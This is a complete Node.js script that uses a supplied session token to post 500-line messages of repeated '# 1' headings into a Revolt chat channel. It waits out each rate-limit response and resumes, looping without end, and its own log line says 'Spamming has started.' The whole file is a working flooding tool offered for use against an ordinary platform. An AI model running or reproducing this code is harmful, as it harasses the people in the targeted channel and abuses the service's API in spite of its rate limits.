"use strict";

// Dependencies
const request = require("request-async")
const delay = require("delay")

// Variables
const args = process.argv.slice(2)

// Functions
function makePayload(){
    var payload = "# 1"

    for( let i = 0; i <= 498; i++ ) payload += "\n# 1"

    return payload
}

async function spam(){
    var response = await request.post(`https://api.revolt.chat/channels/${args[1]}/messages`, {
        headers: {
            "content-type": "application/json",
            "x-session-token": args[0]
        },
        body: JSON.stringify({ nonce: `AAAAAAAA${Math.floor(Math.random() * 9999999999)}`, content: makePayload() })
    })

    response = JSON.parse(response.body)

    if(response.hasOwnProperty("retry_after")){
        console.log(`Limit detected. Retry after: ${response.retry_after}`)

        await delay(response.retry_after)
    }else{
        console.log("Payload sent.")

        await delay(4000)
    }

    spam()
}

// Main
if(!args.length) return console.log("usage: node index.js <token> <channelID>")
if(!args[1]) return console.log("Invalid channelID.")

console.log("Spamming has started.")
spam()